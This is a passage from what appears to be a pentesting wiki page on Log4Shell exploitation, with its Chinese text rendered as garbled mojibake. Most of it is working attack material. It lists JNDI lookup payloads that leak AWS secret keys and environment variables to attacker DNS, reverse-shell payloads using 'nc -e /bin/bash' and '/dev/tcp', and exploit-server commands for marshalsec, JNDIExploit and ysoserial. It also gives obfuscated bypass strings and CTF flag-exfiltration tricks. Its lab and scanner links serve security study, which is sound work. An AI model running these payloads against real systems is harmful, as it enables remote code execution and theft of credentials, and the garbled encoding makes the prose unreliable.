è¯·è®°ä½ï¼Œè¦**åˆ©ç”¨ç‰ˆæœ¬2.15**ï¼Œæ‚¨éœ€è¦æ·»åŠ **æœ¬åœ°ä¸»æœºæ£€æŸ¥ç»•è¿‡**ï¼š${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **æœ¬åœ°å‘ç°**

æœç´¢**æœ¬åœ°æœ‰æ¼æ´çš„ç‰ˆæœ¬**çš„åº“ï¼š
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **éªŒè¯**

ä¹‹å‰åˆ—å‡ºçš„ä¸€äº›å¹³å°å…è®¸æ‚¨æ’å…¥ä¸€äº›å˜é‡æ•°æ®ï¼Œåœ¨è¯·æ±‚æ—¶å°†å…¶è®°å½•ä¸‹æ¥ã€‚\
è¿™å¯¹äºä¸¤ä»¶äº‹éå¸¸æœ‰ç”¨ï¼š

* **éªŒè¯**æ¼æ´
* æ»¥ç”¨æ¼æ´**çªƒå–ä¿¡æ¯**

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥è¯·æ±‚ç±»ä¼¼äºï¼š\
æˆ–è€…`${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`**ï¼Œå¦‚æœæ”¶åˆ°å…·æœ‰ç¯å¢ƒå˜é‡å€¼çš„**DNSè¯·æ±‚**ï¼Œåˆ™è¯´æ˜åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ã€‚

æ‚¨å¯ä»¥å°è¯•**æ³„éœ²**çš„å…¶ä»–ä¿¡æ¯åŒ…æ‹¬ï¼š
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE ä¿¡æ¯

{% hint style="info" %}
è¿è¡Œåœ¨ **JDK ç‰ˆæœ¬é«˜äº 6u141ã€7u131ã€8u121 çš„ä¸»æœºå°†å—åˆ° LDAP ç±»åŠ è½½çš„ä¿æŠ¤**ï¼Œä½†ä¸å—åºåˆ—åŒ–å‘é‡çš„ä¿æŠ¤ã€‚è¿™æ˜¯å› ä¸º `com.sun.jndi.ldap.object.trustURLCodebase` é»˜è®¤æƒ…å†µä¸‹è¢«ç¦ç”¨ï¼Œå› æ­¤ JNDI æ— æ³•ä½¿ç”¨ LDAP åŠ è½½è¿œç¨‹ä»£ç åº“ã€‚ä½†æˆ‘ä»¬å¿…é¡»å¼ºè°ƒï¼Œä»ç„¶å¯èƒ½å‘ç”Ÿåºåˆ—åŒ–å’Œå˜é‡æ³„æ¼ã€‚\
è¿™æ„å‘³ç€è¦ **åˆ©ç”¨ä¸Šè¿°ç‰ˆæœ¬**ï¼Œæ‚¨éœ€è¦ **æ»¥ç”¨ä¸€äº›å­˜åœ¨äº Java åº”ç”¨ç¨‹åºä¸Šçš„å—ä¿¡ä»»çš„ gadget**ï¼ˆä¾‹å¦‚ä½¿ç”¨ ysoserial æˆ– JNDIExploitï¼‰ã€‚ä½†è¦åˆ©ç”¨è¾ƒä½ç‰ˆæœ¬ï¼Œæ‚¨å¯ä»¥ä½¿å®ƒä»¬åŠ è½½å¹¶æ‰§è¡Œä»»æ„ç±»ï¼ˆè¿™ä½¿æ”»å‡»æ›´å®¹æ˜“ï¼‰ã€‚

æœ‰å…³ **æ›´å¤šä¿¡æ¯**ï¼ˆä¾‹å¦‚ RMI å’Œ CORBA å‘é‡çš„é™åˆ¶ï¼‰ï¼Œè¯·æŸ¥çœ‹å‰é¢çš„ JNDI å‘½åå‚è€ƒéƒ¨åˆ†æˆ– [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - ä½¿ç”¨è‡ªå®šä¹‰æœ‰æ•ˆè½½è·çš„ Marshalsec

_è¿™ä¸ªæŠ€å·§å®Œå…¨æ¥è‡ªäº **THM box:**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)\_\_

å¯¹äºè¿™ä¸ªæ¼æ´åˆ©ç”¨ï¼Œå°†ä½¿ç”¨å·¥å…· [**marshalsec**](https://github.com/mbechler/marshalsec)ï¼ˆä»è¿™é‡Œä¸‹è½½ [**jar ç‰ˆæœ¬**](https://github.com/RandomRobbieBF/marshalsec-jar)ï¼‰åˆ›å»ºä¸€ä¸ª LDAP å¼•èæœåŠ¡å™¨ï¼Œå°†è¿æ¥å¼•å¯¼åˆ°æˆ‘ä»¬çš„æ¬¡è¦ HTTP æœåŠ¡å™¨ï¼Œæ¼æ´åˆ©ç”¨å°†åœ¨å…¶ä¸­æä¾›ï¼š
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
æˆ‘ä»¬å¸Œæœ›å—å®³è€…åŠ è½½å‘é€åå‘ shell çš„ä»£ç ï¼Œå› æ­¤æ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸º Exploit.java çš„ Java æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

åˆ›å»º**ç±»æ–‡ä»¶**æ‰§è¡Œï¼š`javac Exploit.java -source 8 -target 8`ï¼Œç„¶ååœ¨åˆ›å»ºç±»æ–‡ä»¶çš„åŒä¸€ç›®å½•ä¸‹è¿è¡Œ**HTTPæœåŠ¡å™¨**ï¼š`python3 -m http.server`ã€‚\
**marshalsecçš„LDAPæœåŠ¡å™¨åº”è¯¥æŒ‡å‘è¿™ä¸ªHTTPæœåŠ¡å™¨**ã€‚\
ç„¶åï¼Œæ‚¨å¯ä»¥é€šè¿‡å‘é€å¦‚ä¸‹è´Ÿè½½ä½¿**æ˜“å—æ”»å‡»çš„WebæœåŠ¡å™¨æ‰§è¡Œæ”»å‡»ç±»**ï¼š
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
### RCE - **JNDIExploit**

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœJavaæœªé…ç½®ä¸ºä½¿ç”¨LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ï¼Œåˆ™æ­¤è‡ªå®šä¹‰æ¼æ´åˆ©ç”¨å°†æ— æ³•å·¥ä½œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éœ€è¦æ»¥ç”¨ä¸€ä¸ªå—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
{% endhint %}

### JNDIExploit - è¿œç¨‹ä»£ç æ‰§è¡Œ

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œç”±äºå‘ç°äº†log4shellåï¼Œä½œè€…ä»GitHubä¸Šåˆ é™¤äº†æ­¤é¡¹ç›®ã€‚æ‚¨å¯ä»¥åœ¨[https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2)ä¸­æ‰¾åˆ°ç¼“å­˜ç‰ˆæœ¬ï¼Œä½†å¦‚æœæ‚¨å¸Œæœ›å°Šé‡ä½œè€…çš„å†³å®šï¼Œè¯·ä½¿ç”¨å…¶ä»–æ–¹æ³•æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚

æ­¤å¤–ï¼Œæ‚¨æ— æ³•åœ¨wayback machineä¸­æ‰¾åˆ°æºä»£ç ï¼Œå› æ­¤è¦ä¹ˆåˆ†ææºä»£ç ï¼Œè¦ä¹ˆæ‰§è¡Œjaræ–‡ä»¶ï¼ŒçŸ¥é“æ‚¨ä¸çŸ¥é“è‡ªå·±åœ¨æ‰§è¡Œä»€ä¹ˆã€‚
{% endhint %}

å¯¹äºæ­¤ç¤ºä¾‹ï¼Œæ‚¨å¯ä»¥åœ¨ç«¯å£8080ä¸Šè¿è¡Œæ­¤**æ˜“å—log4shellæ”»å‡»çš„WebæœåŠ¡å™¨**ï¼š[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)ï¼ˆ_åœ¨è‡ªè¿°æ–‡ä»¶ä¸­ï¼Œæ‚¨å°†æ‰¾åˆ°å¦‚ä½•è¿è¡Œå®ƒçš„è¯´æ˜_ï¼‰ã€‚æ­¤æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä½¿ç”¨æ˜“å—æ”»å‡»çš„log4shellç‰ˆæœ¬è®°å½•HTTPè¯·æ±‚å¤´_X-Api-Version_çš„å†…å®¹ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥ä¸‹è½½**JNDIExploit**çš„jaræ–‡ä»¶å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œå®ƒï¼š
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
é˜…è¯»ä»£ç ä»…éœ€å‡ åˆ†é’Ÿï¼Œä½ å¯ä»¥åœ¨_com.feihong.ldap.LdapServer_å’Œ_com.feihong.ldap.HTTPServer_ä¸­çœ‹åˆ°**LDAPå’ŒHTTPæœåŠ¡å™¨çš„åˆ›å»ºæ–¹å¼**ã€‚LDAPæœåŠ¡å™¨å°†ç†è§£éœ€è¦æä¾›çš„æœ‰æ•ˆè½½è·ï¼Œå¹¶å°†å—å®³è€…é‡å®šå‘åˆ°HTTPæœåŠ¡å™¨ï¼Œåè€…å°†æä¾›åˆ©ç”¨ç¨‹åºã€‚\
åœ¨_com.feihong.ldap.gadgets_ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°**ä¸€äº›ç‰¹å®šçš„å°å·¥å…·**ï¼Œå¯ç”¨äºæ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆæ½œåœ¨åœ°æ‰§è¡Œä»»æ„ä»£ç ï¼‰ã€‚è€Œåœ¨_com.feihong.ldap.template_ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸åŒçš„æ¨¡æ¿ç±»ï¼Œå®ƒä»¬å°†**ç”Ÿæˆåˆ©ç”¨ç¨‹åº**ã€‚

ä½ å¯ä»¥é€šè¿‡**`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„åˆ©ç”¨ç¨‹åºã€‚ä¸€äº›æœ‰ç”¨çš„åˆ©ç”¨ç¨‹åºåŒ…æ‹¬ï¼š
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
æ‰€ä»¥ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å·²ç»è¿è¡Œäº†ä¸€ä¸ªå®¹æ˜“å—æ”»å‡»çš„ Docker åº”ç”¨ã€‚è¦å¯¹å…¶è¿›è¡Œæ”»å‡»ï¼š
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
åœ¨å‘é€æ”»å‡»æ—¶ï¼Œæ‚¨å°†åœ¨æ‰§è¡Œ**JNDIExploit-1.2-SNAPSHOT.jar**çš„ç»ˆç«¯ä¸­çœ‹åˆ°ä¸€äº›è¾“å‡ºã€‚

**è¯·è®°ä½æ£€æŸ¥`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`ä»¥è·å–å…¶ä»–åˆ©ç”¨é€‰é¡¹ã€‚æ­¤å¤–ï¼Œå¦‚æœéœ€è¦ï¼Œæ‚¨å¯ä»¥æ›´æ”¹LDAPå’ŒHTTPæœåŠ¡å™¨çš„ç«¯å£ã€‚**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

ä¸ä¹‹å‰çš„åˆ©ç”¨æ–¹å¼ç±»ä¼¼ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚\
æ‚¨å¯ä»¥ç”Ÿæˆè¦å‘é€ç»™å—å®³è€…çš„URLï¼š
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_è¿™ç§ä½¿ç”¨è‡ªå®šä¹‰ç”Ÿæˆçš„Javaå¯¹è±¡çš„æ”»å‡»æ–¹æ³•åœ¨åƒ**THMå¤ªé˜³èƒ½æˆ¿é—´**è¿™æ ·çš„å®éªŒå®¤ä¸­æœ‰æ•ˆã€‚ç„¶è€Œï¼Œé€šå¸¸æƒ…å†µä¸‹è¿™ç§æ”»å‡»ä¸èµ·ä½œç”¨ï¼ˆå› ä¸ºé»˜è®¤æƒ…å†µä¸‹Javaæ²¡æœ‰é…ç½®ä¸ºä½¿ç”¨LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ï¼‰ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯å› ä¸ºå®ƒæ²¡æœ‰æ»¥ç”¨å—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚_

### RCE - ysoserialå’ŒJNDI-Exploit-Kit

è¿™ä¸ªé€‰é¡¹éå¸¸é€‚ç”¨äºæ”»å‡»**ä»…ä¿¡ä»»æŒ‡å®šç±»è€Œä¸æ˜¯æ‰€æœ‰äººçš„Javaç‰ˆæœ¬**ã€‚å› æ­¤ï¼Œå°†ä½¿ç”¨**ysoserial**ç”Ÿæˆ**å—ä¿¡ä»»ç±»çš„åºåˆ—åŒ–**ï¼Œè¿™äº›åºåˆ—åŒ–å¯ä»¥ç”¨ä½œgadgetæ¥**æ‰§è¡Œä»»æ„ä»£ç **ï¼ˆ_ysoserialæ»¥ç”¨çš„å—ä¿¡ä»»ç±»å¿…é¡»è¢«å—å®³è€…çš„Javaç¨‹åºä½¿ç”¨ï¼Œä»¥ä½¿åˆ©ç”¨ç”Ÿæ•ˆ_ï¼‰ã€‚

ä½¿ç”¨**ysoserial**æˆ–[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)å¯ä»¥åˆ›å»ºç”±JNDIä¸‹è½½çš„ååºåˆ—åŒ–åˆ©ç”¨ç¨‹åºï¼š
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
ä½¿ç”¨[JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)ç”Ÿæˆ**JNDIé“¾æ¥**ï¼Œåœ¨è¿™äº›é“¾æ¥ä¸­ï¼Œæ¼æ´æœºå™¨å°†è¿æ¥åˆ°ç­‰å¾…çš„æ¼æ´åˆ©ç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨JNDI-Exploit-Kitè‡ªåŠ¨ç”Ÿæˆçš„**ä¸åŒæ¼æ´åˆ©ç”¨**ï¼Œæˆ–è€…ä½¿ç”¨æ‚¨è‡ªå·±æˆ–ysoserialç”Ÿæˆçš„**ååºåˆ—åŒ–æœ‰æ•ˆè½½è·**ã€‚
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

ç°åœ¨ï¼Œæ‚¨å¯ä»¥è½»æ¾ä½¿ç”¨ç”Ÿæˆçš„JNDIé“¾æ¥æ¥åˆ©ç”¨æ¼æ´å¹¶è·å–ä¸€ä¸ª**åå‘shell**ï¼Œåªéœ€å°†å…¶å‘é€åˆ°ä¸€ä¸ªæ˜“å—æ”»å‡»çš„log4jç‰ˆæœ¬ï¼š**`${ldap://10.10.14.10:1389/generated}`**

### ç»•è¿‡æ–¹æ³•
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:Ä±}}:ldap://...} //Notice the unicode "i"
```
### è‡ªåŠ¨æ‰«æå·¥å…·

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - æŸ¥æ‰¾æœ¬åœ°æ˜“å—æ”»å‡»çš„åº“

### ç”¨äºæµ‹è¯•çš„å®éªŒå®¤

* [**LogForge HTB æœºå™¨**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar æˆ¿é—´**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shell æ¼æ´åˆ©ç”¨å

åœ¨è¿™ä¸ª[**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)ä¸­ï¼Œè¯¦ç»†è§£é‡Šäº†å¦‚ä½•æ½œåœ¨åœ°æ»¥ç”¨ Log4J çš„ä¸€äº›åŠŸèƒ½ã€‚

Log4j çš„[**å®‰å…¨é¡µé¢**](https://logging.apache.org/log4j/2.x/security.html)ä¸­æœ‰ä¸€äº›æœ‰è¶£çš„å¥å­ï¼š

> ä»ç‰ˆæœ¬ 2.16.0ï¼ˆé€‚ç”¨äº Java 8ï¼‰å¼€å§‹ï¼Œ**æ¶ˆæ¯æŸ¥æ‰¾åŠŸèƒ½å·²å®Œå…¨ç§»é™¤**ã€‚**é…ç½®ä¸­çš„æŸ¥æ‰¾ä»ç„¶æœ‰æ•ˆ**ã€‚æ­¤å¤–ï¼ŒLog4j ç°åœ¨é»˜è®¤ç¦ç”¨å¯¹ JNDI çš„è®¿é—®ã€‚é…ç½®ä¸­çš„ JNDI æŸ¥æ‰¾ç°åœ¨éœ€è¦æ˜¾å¼å¯ç”¨ã€‚

> ä»ç‰ˆæœ¬ 2.17.0 å¼€å§‹ï¼ˆå¯¹äº Java 7 å’Œ Java 6ï¼Œç‰ˆæœ¬ä¸º 2.12.3 å’Œ 2.3.1ï¼‰ï¼Œ**åªæœ‰é…ç½®ä¸­çš„æŸ¥æ‰¾å­—ç¬¦ä¸²ä¼šé€’å½’å±•å¼€**ï¼›åœ¨å…¶ä»–ä»»ä½•ç”¨æ³•ä¸­ï¼Œåªä¼šè§£æé¡¶çº§æŸ¥æ‰¾ï¼Œä»»ä½•åµŒå¥—çš„æŸ¥æ‰¾éƒ½ä¸ä¼šè§£æã€‚

è¿™æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥**å¿˜è®°ä½¿ç”¨ä»»ä½• `jndi` æ”»å‡»**ã€‚æ­¤å¤–ï¼Œè¦æ‰§è¡Œ**é€’å½’æŸ¥æ‰¾**ï¼Œæ‚¨éœ€è¦è¿›è¡Œç›¸åº”çš„é…ç½®ã€‚

ä¾‹å¦‚ï¼Œåœ¨è¯¥ CTF ä¸­ï¼Œè¿™åœ¨æ–‡ä»¶ log4j2.xml ä¸­è¿›è¡Œäº†é…ç½®ï¼š
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

åœ¨è¿™ä¸ªCTFä¸­ï¼Œæ”»å‡»è€…æ§åˆ¶äº†`${sys:cmd}`çš„å€¼ï¼Œå¹¶ä¸”éœ€è¦ä»ç¯å¢ƒå˜é‡ä¸­çªƒå–flagã€‚å¦‚åœ¨[**ä¹‹å‰çš„è´Ÿè½½**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)ä¸­æ‰€ç¤ºï¼Œæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥è®¿é—®ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚ï¼š`${env:FLAG}`ã€‚åœ¨è¿™ä¸ªCTFä¸­è¿™ä¸ªæ–¹æ³•æ˜¯æ— ç”¨çš„ï¼Œä½†åœ¨å…¶ä»–çœŸå®åœºæ™¯ä¸­å¯èƒ½ä¼šæœ‰ç”¨ã€‚

### å¼‚å¸¸ä¸­çš„ä¿¡æ¯çªƒå–

åœ¨CTFä¸­ï¼Œä½ æ— æ³•ä½¿ç”¨log4Jè®¿é—®javaåº”ç”¨ç¨‹åºçš„stderrï¼Œä½†æ˜¯Log4Jçš„å¼‚å¸¸ä¼šè¢«å‘é€åˆ°stdoutï¼Œè€Œpythonåº”ç”¨ç¨‹åºä¼šå°†å…¶æ‰“å°å‡ºæ¥ã€‚è¿™æ„å‘³ç€é€šè¿‡è§¦å‘å¼‚å¸¸ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®å†…å®¹ã€‚ä¸€ä¸ªç”¨äºçªƒå–flagçš„å¼‚å¸¸æ˜¯ï¼š`${java:${env:FLAG}}`ã€‚è¿™ä¸ªæ–¹æ³•æœ‰æ•ˆæ˜¯å› ä¸º`${java:CTF{blahblah}}`ä¸å­˜åœ¨ï¼Œè€Œä¼šæ˜¾ç¤ºä¸€ä¸ªå¸¦æœ‰flagå€¼çš„å¼‚å¸¸ï¼š

![](<../../.gitbook/assets/image (157).png>)

### è½¬æ¢æ¨¡å¼å¼‚å¸¸

åªæ˜¯æä¸€ä¸‹ï¼Œä½ ä¹Ÿå¯ä»¥æ³¨å…¥æ–°çš„[**è½¬æ¢æ¨¡å¼**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)å¹¶è§¦å‘è¢«è®°å½•åˆ°`stdout`çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ï¼š

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

è¿™å¯¹äºåœ¨é”™è¯¯æ¶ˆæ¯ä¸­çªƒå–æ—¥æœŸå¹¶ä¸æœ‰ç”¨ï¼Œå› ä¸ºæŸ¥æ‰¾åœ¨è½¬æ¢æ¨¡å¼ä¹‹å‰æ²¡æœ‰è¢«è§£å†³ï¼Œä½†å¯¹äºå…¶ä»–ä¸€äº›ä»»åŠ¡ï¼Œå¦‚æ£€æµ‹ï¼Œå¯èƒ½ä¼šæœ‰ç”¨ã€‚

### è½¬æ¢æ¨¡å¼æ­£åˆ™è¡¨è¾¾å¼

ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„**è½¬æ¢æ¨¡å¼**æ¥é€šè¿‡ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œæ»¥ç”¨**äºŒåˆ†æœç´¢**æˆ–**åŸºäºæ—¶é—´**çš„è¡Œä¸ºæ¥çªƒå–æŸ¥æ‰¾ä¸­çš„ä¿¡æ¯ã€‚

* **é€šè¿‡å¼‚å¸¸æ¶ˆæ¯è¿›è¡ŒäºŒåˆ†æœç´¢**

è½¬æ¢æ¨¡å¼**`%replace`**å¯ä»¥ç”¨äº**æ›¿æ¢**å­—ç¬¦ä¸²ä¸­çš„**å†…å®¹**ï¼Œç”šè‡³ä½¿ç”¨**æ­£åˆ™è¡¨è¾¾å¼**ã€‚å®ƒçš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š`replace{pattern}{regex}{substitution}`\
é€šè¿‡æ»¥ç”¨è¿™ç§è¡Œä¸ºï¼Œä½ å¯ä»¥ä½¿å¾—**å¦‚æœæ­£åˆ™è¡¨è¾¾å¼åœ¨å­—ç¬¦ä¸²ä¸­åŒ¹é…åˆ°ä»»ä½•å†…å®¹ï¼Œåˆ™è§¦å‘å¼‚å¸¸ï¼ˆå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¸ä¼šè§¦å‘å¼‚å¸¸ï¼‰**ï¼Œåƒè¿™æ ·ï¼š
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **åŸºäºæ—¶é—´çš„æ”»å‡»**

æ­£å¦‚åœ¨å‰ä¸€èŠ‚ä¸­æåˆ°çš„ï¼Œ**`%replace`** æ”¯æŒ **æ­£åˆ™è¡¨è¾¾å¼**ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨æ¥è‡ª [**ReDoS é¡µé¢**](../regular-expression-denial-of-service-redos.md) çš„è´Ÿè½½ï¼Œåœ¨æ‰¾åˆ°æ ‡å¿—æ—¶å¼•å‘ **è¶…æ—¶**ã€‚\
ä¾‹å¦‚ï¼Œåƒ `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` è¿™æ ·çš„è´Ÿè½½å°†åœ¨è¯¥ CTF ä¸­è§¦å‘è¶…æ—¶ã€‚

åœ¨è¿™ä¸ª [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) ä¸­ï¼Œå®ƒæ²¡æœ‰ä½¿ç”¨ ReDoS æ”»å‡»ï¼Œè€Œæ˜¯ä½¿ç”¨äº†ä¸€ç§ **æ”¾å¤§æ”»å‡»** æ¥å¼•å‘å“åº”ä¸­çš„æ—¶é—´å·®å¼‚ï¼š

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
